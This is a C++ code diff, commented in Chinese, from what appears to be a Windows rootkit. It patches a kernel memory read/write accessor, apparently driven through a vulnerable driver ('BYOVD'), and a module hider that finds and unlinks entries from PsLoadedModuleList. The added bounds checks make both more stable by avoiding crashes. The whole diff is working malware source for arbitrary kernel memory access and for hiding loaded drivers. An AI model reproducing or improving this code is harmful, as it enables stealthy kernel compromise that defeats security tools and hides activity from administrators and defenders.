@@ -1684,6 +1684,11 @@ bool KernelMemoryAccessor::ReadKernelVA(uint64_t va, void* outBuf, size_t size) 
     //                排除系统 PTE (0xFFFFFD00+) + 系统映射 + Hypervisor.
     if (va < 0xFFFF800000000000ULL) return false;       // ★ v3.296: 下限放宽到 0xFFFF8000
     if (va >= 0xFFFFFD0000000000ULL) return false;      // ★ v3.231: 排除系统 PTE (v3.228 蓝屏 0x50 根因)
+    // ★ v3.296 FIX-13: 检查结束地址 va+size 不超过白名单上限
+    //   原因: 只检查起始地址 va, 不检查 va+size. 若 va 接近上限 (如 0xFFFFFCFF),
+    //         va+size 跨越到系统 PTE 区域 (0xFFFFFD00+), driver memcpy 读取未映射页 → 0x50 蓝屏.
+    //   修复: 检查 va+size <= 0xFFFFFD00, 超过则拒绝.
+    if (va + size > 0xFFFFFD0000000000ULL) return false;  // ★ FIX-13: 结束地址范围检查
 
     // ★ BUILD 489: 根据驱动类型分发
     if (g_isPdfwKrnl) {
@@ -1704,6 +1709,8 @@ bool KernelMemoryAccessor::WriteKernelVA(uint64_t va, const void* inBuf, size_t 
     //   安全性: FLT_OPERATION_REGISTRATION 是有效内核池内存, 写入不蓝屏.
     if (va < 0xFFFF800000000000ULL) return false;       // ★ v3.296: 下限放宽到 0xFFFF8000
     if (va >= 0xFFFFFD0000000000ULL) return false;      // ★ v3.231: 排除系统 PTE
+    // ★ v3.296 FIX-13: 检查结束地址 va+size 不超过白名单上限 (同 ReadKernelVA)
+    if (va + size > 0xFFFFFD0000000000ULL) return false;  // ★ FIX-13: 结束地址范围检查
 
     // ★ BUILD 489: 根据驱动类型分发
     if (g_isPdfwKrnl) {
@@ -4679,6 +4686,22 @@ uint64_t PsLoadedModuleHider::LocatePsLoadedModuleList(uint64_t ntosBase) {
             // 排除指向自身的孤立节点 (PsLoadedModuleList 头节点的 Flink 不会指向自身)
             if (flink == dataVA + off + i) continue;
 
+            // ★ v3.296 FIX-13: 确保 flink + 0x68 (最大读取偏移 LDR_BASE_DLL_NAME_BUF_OFF+8)
+            //   与 flink 在同一白名单子区域内, 避免跨子区域读取到未映射页 → 0x50 蓝屏.
+            //   子区域: 内核镜像 [0xFFFFF800, 0xFFFFFA00), 非分页池 [0xFFFFFA00, 0xFFFFFC00).
+            //   若 flink 在子区域末尾 (如 0xFFFFF9FF...), flink+0x68 跨入下一子区域,
+            //   下一子区域起始可能有未映射页 → driver memcpy 蓝屏.
+            {
+                auto inSameSubRegion = [](uint64_t va, uint64_t end) -> bool {
+                    if (va >= 0xFFFFF80000000000ULL && va < 0xFFFFFA0000000000ULL)
+                        return end <= 0xFFFFFA0000000000ULL;
+                    if (va >= 0xFFFFFA0000000000ULL && va < 0xFFFFFC0000000000ULL)
+                        return end <= 0xFFFFFC0000000000ULL;
+                    return false;
+                };
+                if (!inSameSubRegion(flink, flink + 0x68)) continue;
+            }
+
             uint64_t candidateVA = dataVA + off + i;
 
             // 条件 2: Flink + 0x30 (DllBase) == ntosBase (第一个模块是 ntoskrnl.exe)
@@ -4744,6 +4767,15 @@ uint64_t PsLoadedModuleHider::FindEntryByBaseName(uint64_t listHead, const wchar
             bool validPtr = (current >= 0xFFFFF80000000000ULL && current < 0xFFFFFA0000000000ULL) ||  // 内核镜像
                             (current >= 0xFFFFFA0000000000ULL && current < 0xFFFFFC0000000000ULL);    // 非分页池
             if (!validPtr) break;
+            // ★ v3.296 FIX-13: 确保 current+0x68 与 current 在同一子区域 (同 LocatePsLoadedModuleList)
+            auto inSameSubRegion = [](uint64_t va, uint64_t end) -> bool {
+                if (va >= 0xFFFFF80000000000ULL && va < 0xFFFFFA0000000000ULL)
+                    return end <= 0xFFFFFA0000000000ULL;
+                if (va >= 0xFFFFFA0000000000ULL && va < 0xFFFFFC0000000000ULL)
+                    return end <= 0xFFFFFC0000000000ULL;
+                return false;
+            };
+            if (!inSameSubRegion(current, current + 0x68)) break;
         }
 
         // 读取 BaseDllName (UNICODE_STRING @ +0x58)
@@ -4794,6 +4826,19 @@ bool PsLoadedModuleHider::PerformUnlink(uint64_t entryAddr, uint64_t listHead) {
     if (curFlink <= 0xFFFF800000000000ULL || curBlink <= 0xFFFF800000000000ULL) {
         ByovdDiag("B564:Unlink: FAIL invalid links (flink/blink not in kernel)\n");
         return false;
+    }
+    // ★ v3.296 FIX-13: Flink/Blink 必须在内核镜像或非分页池白名单内
+    //   (与 LocatePsLoadedModuleList/FindEntryByBaseName 一致), 防止误用系统 PTE 等未映射区域.
+    {
+        auto isValidListPtr = [](uint64_t va) -> bool {
+            if (va >= 0xFFFFF80000000000ULL && va < 0xFFFFFA0000000000ULL) return true;  // 内核镜像
+            if (va >= 0xFFFFFA0000000000ULL && va < 0xFFFFFC0000000000ULL) return true;  // 非分页池
+            return false;
+        };
+        if (!isValidListPtr(curFlink) || !isValidListPtr(curBlink)) {
+            ByovdDiag("B564:Unlink: FAIL flink/blink outside whitelist\n");
+            return false;
+        }
     }
     if (curFlink == entryAddr && curBlink == entryAddr) {
         ByovdDiag("B564:Unlink: entry already self-loop (may be already hidden)\n");
